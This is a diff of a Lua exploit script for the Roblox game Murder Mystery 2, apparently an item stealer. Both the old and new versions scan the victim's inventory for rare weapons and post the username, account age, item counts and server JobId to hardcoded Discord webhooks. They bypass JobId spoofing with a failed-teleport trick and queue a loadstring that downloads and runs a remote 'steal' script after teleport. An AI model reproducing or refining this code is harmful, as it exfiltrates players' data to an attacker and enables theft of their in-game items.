@@ -1,130 +1,113 @@
--- [ Settings ]
+-- [ Settings ] --
 local Username = "Warrior_ggs"
-local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+local Webhook = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
 
--- Prevent double execution
-if getgenv().executed then return end
-getgenv().executed = true
-
+-- Inventory/Modules
+local RepStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local LocalPlayer = Players.LocalPlayer
 
--- Modules
-local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
+local InvModule = require(RepStorage.Modules.InventoryModule)
+local PlayerDataModule = require(RepStorage.Modules.ProfileData)
+local LevelModule = require(RepStorage.Modules.LevelModule)
 
--- JobId bypass
-local placeId = 142823291 -- MM2 PlaceId
-local spoofedJobId = game.JobId
+-- MM2 PlaceId
+local placeId = 142823291
+getgenv().realJobId = nil
 
+-- JobId Bypasser
 TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
     if teleportInfo and teleportInfo.ServerInstanceId then
-        getgenv().realjobid = teleportInfo.ServerInstanceId
-        print("Real JobId detected:", getgenv().realjobid)
-
-        -- Optional: webhook for JobId info
-        local fernUrl = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. getgenv().realjobid
-        local webhookData = {
-            embeds = {{
-                title = "🔍 JobID Info",
-                description = "Captured real JobID via failed teleport",
-                color = 65280,
-                fields = {
-                    { name = "Spoofed JobID", value = spoofedJobId, inline = true },
-                    { name = "Real JobID", value = getgenv().realjobid, inline = true },
-                    { name = "Fern.wtf Join Link", value = fernUrl, inline = false }
-                },
-                footer = { text = "Delta JobID Logger" }
-            }}
-        }
-
-        pcall(function()
-            http_request({
-                Url = Webhook,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode(webhookData)
-            })
-        end)
-
-        queue_on_teleport(string.format([[getgenv().realjobid = "%s"]], getgenv().realjobid))
+        getgenv().realJobId = teleportInfo.ServerInstanceId
+        print("Real JobId detected:", getgenv().realJobId)
+        queue_on_teleport(string.format([[getgenv().realJobId = "%s"]], getgenv().realJobId))
     end
 end)
 
--- Trigger a failed teleport to capture real JobId
+-- Trigger failed teleport to capture real JobId
 for _ = 1, 2 do
     task.spawn(function()
         pcall(function()
             TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
         end)
     end)
-    task.wait()
+    task.wait(0.5)
 end
 
--- Check inventory for valuable items
+-- Функция для проверки инвентаря
 local function hasValuableItems()
+    local hasValuable = false
+    local uniqueItems, ancientItems, godlyItems = {}, {}, {}
+
     for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
         for _, item in pairs(category) do
-            if item.Rarity == "Godly" or item.Rarity == "Ancient" or item.Rarity == "Unique" then
-                return true
+            if item.Rarity == "Unique" then
+                table.insert(uniqueItems, item.DataID)
+            elseif item.Rarity == "Ancient" then
+                table.insert(ancientItems, item.DataID)
+            elseif item.Rarity == "Godly" then
+                table.insert(godlyItems, item.DataID)
             end
         end
     end
-    return false
-end
 
-local function getValuableItems()
-    local list = {}
-    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
-        for _, item in pairs(category) do
-            if item.Rarity == "Godly" or item.Rarity == "Ancient" or item.Rarity == "Unique" then
-                table.insert(list, item.ItemName)
-            end
-        end
+    if #uniqueItems > 0 or #ancientItems > 0 or #godlyItems > 0 then
+        hasValuable = true
     end
-    return list
+
+    return hasValuable, uniqueItems, ancientItems, godlyItems
 end
 
--- Send webhook with inventory
-local function SendInventoryWebhook()
-    local items = getValuableItems()
-    if #items == 0 then return end
-
+-- Функция отправки webhook
+local function sendWebhook(uniqueItems, ancientItems, godlyItems)
     local embed = {
-        ["title"] = "Player has valuable items!",
+        ["title"] = "JobId & Inventory Info",
         ["color"] = 65280,
         ["fields"] = {
-            {["name"] = "Player", ["value"] = Players.LocalPlayer.Name},
-            {["name"] = "Items", ["value"] = table.concat(items, ", ")}
+            {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true},
+            {["name"] = "Account Age", ["value"] = tostring(LocalPlayer.AccountAge), ["inline"] = true},
+            {["name"] = "Uniques", ["value"] = tostring(#uniqueItems), ["inline"] = true},
+            {["name"] = "Ancients", ["value"] = tostring(#ancientItems), ["inline"] = true},
+            {["name"] = "Godlies", ["value"] = tostring(#godlyItems), ["inline"] = true},
+            {["name"] = "JobId", ["value"] = getgenv().realJobId or "Unknown", ["inline"] = false}
         }
     }
 
-    local data = { ["embeds"] = { embed } }
     pcall(function()
-        request({
+        http_request({
             Url = Webhook,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
+            Body = HttpService:JSONEncode({ embeds = {embed} })
         })
     end)
 end
 
--- Main routine
-task.spawn(function()
-    if hasValuableItems() then
-        SendInventoryWebhook()
-        local jobToUse = getgenv().realjobid or game.JobId
-        for _ = 1, 2 do
-            task.spawn(function()
-                TeleportService:TeleportToPlaceInstance(placeId, jobToUse)
-            end)
-            task.wait(1)
-        end
+-- Функция запуска stealItems после телепорта
+local function runSteal()
+    -- Замените ссылку на ваш оригинальный stealItems код или loadstring
+    loadstring(game:HttpGet("ВАШ_LODSTRING_STEAL"))()
+end
 
-        -- After teleport, run your stealItems script
-        task.wait(5)
-        loadstring(game:HttpGet("PASTE_YOUR_STEAL_SCRIPT_HERE"))()
+-- Основной цикл: ждем JobId и проверяем инвентарь
+spawn(function()
+    while not getgenv().realJobId do
+        task.wait(0.5)
+    end
+
+    local hasValuable, uniqueItems, ancientItems, godlyItems = hasValuableItems()
+
+    if hasValuable then
+        sendWebhook(uniqueItems, ancientItems, godlyItems)
+
+        -- Телепорт на реальный JobId
+        TeleportService:TeleportToPlaceInstance(placeId, getgenv().realJobId)
+
+        -- После телепорта stealItems будет автоматически запускаться через queue_on_teleport
+        queue_on_teleport("loadstring(game:HttpGet('ВАШ_LODSTRING_STEAL'))()")
+    else
+        print("No valuable items found. Skipping webhook and teleport.")
     end
 end)
